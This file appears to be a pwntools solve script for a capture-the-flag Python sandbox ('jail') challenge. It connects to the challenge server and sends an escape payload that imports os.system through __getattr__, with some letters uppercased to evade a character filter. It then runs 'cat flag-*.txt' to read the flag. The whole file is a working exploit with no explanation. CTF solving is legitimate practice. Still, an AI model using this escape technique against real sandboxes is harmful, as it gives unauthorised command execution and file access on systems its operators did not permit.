#!/usr/bin/env python3

import time
import os

from pwn import *

context.log_level = "CRITICAL"

HOST = os.getenv("HOST", "sspj.challs.srdnlen.it")
PORT = int(os.getenv("PORT", 1717))

io = remote(HOST, PORT)

payload = "from os import system as __getattr__; from __main__ import sh"

for c in ["m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k", "g"]:
    if c in payload:
        payload = payload.replace(c, c.upper())

io.sendlineafter(b"Enter your data: ", payload.encode())
time.sleep(1)
io.sendline(b"cat flag-*.txt")

flag = io.recvrepeat(0.5).decode().strip()
print(flag)

io.close()